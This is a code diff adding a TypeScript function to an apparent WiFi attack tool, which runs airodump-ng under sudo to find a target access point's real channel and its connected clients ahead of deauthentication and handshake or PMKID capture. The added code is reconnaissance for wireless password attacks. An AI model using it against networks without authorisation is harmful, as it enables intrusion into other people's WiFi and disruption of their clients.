@@ -94,6 +94,82 @@ export class PmkidRunner extends EventEmitter {
   }
 }
 
+// Brief BSSID-filtered airodump scan (hops all channels) to learn the target's
+// REAL channel and its associated clients. The WiFi Radar's channel is a
+// hopping-capture artifact (it can log the channel it was listening on, not the
+// AP's actual channel), so the attack resolves both from the air right before
+// locking on — otherwise it would lock the wrong channel and capture nothing.
+export async function scanTarget(
+  iface: string,
+  bssid: string,
+  tmpPrefix: string,
+  seconds = 9,
+): Promise<{ channel: number | null; clients: string[] }> {
+  const target = bssid.toUpperCase();
+  await new Promise<void>((resolve) => {
+    const p = spawn(
+      "sudo",
+      ["-n", "airodump-ng", "--bssid", target, "-w", tmpPrefix, "--output-format", "csv", "--write-interval", "1", iface],
+      { detached: true, stdio: ["ignore", "ignore", "pipe"] },
+    );
+    let done = false;
+    const finish = () => {
+      if (done) return;
+      done = true;
+      try {
+        if (p.pid) process.kill(-p.pid, "SIGTERM");
+      } catch {
+        /* already gone */
+      }
+      resolve();
+    };
+    const t = setTimeout(finish, seconds * 1000);
+    p.on("exit", () => {
+      clearTimeout(t);
+      finish();
+    });
+    p.on("error", () => {
+      clearTimeout(t);
+      finish();
+    });
+  });
+
+  let channel: number | null = null;
+  const clients: string[] = [];
+  try {
+    const lines = fs.readFileSync(`${tmpPrefix}-01.csv`, "utf8").split("\n");
+    const stationIdx = lines.findIndex((l) => l.startsWith("Station MAC"));
+    // AP section (before the station header): find the target's channel.
+    for (const line of lines.slice(0, stationIdx < 0 ? lines.length : stationIdx)) {
+      const cols = line.split(",").map((c) => c.trim());
+      if ((cols[0] || "").toUpperCase() === target) {
+        const ch = parseInt(cols[3] || "", 10);
+        if (Number.isFinite(ch) && ch > 0) channel = ch;
+      }
+    }
+    // Station section: clients associated to the target.
+    if (stationIdx >= 0) {
+      for (const line of lines.slice(stationIdx + 1)) {
+        const cols = line.split(",").map((c) => c.trim());
+        const mac = (cols[0] || "").toUpperCase();
+        const assoc = (cols[5] || "").toUpperCase();
+        if (/^([0-9A-F]{2}:){5}[0-9A-F]{2}$/.test(mac) && assoc === target) clients.push(mac);
+      }
+    }
+  } catch {
+    /* no csv -> nothing learned */
+  }
+  // Clean the temp scan files (best-effort).
+  for (const s of ["-01.csv", "-01.cap", "-01.kismet.csv", "-01.kismet.netxml", "-01.log.csv"]) {
+    try {
+      fs.unlinkSync(`${tmpPrefix}${s}`);
+    } catch {
+      /* not there */
+    }
+  }
+  return { channel, clients: [...new Set(clients)] };
+}
+
 // Passive capturer: airodump-ng locks the radio to the target BSSID + channel
 // and writes a rolling .cap (+ .csv listing associated clients). Runs for the
 // whole attack so the deauth-triggered 4-way handshake (and any PMKID) lands in
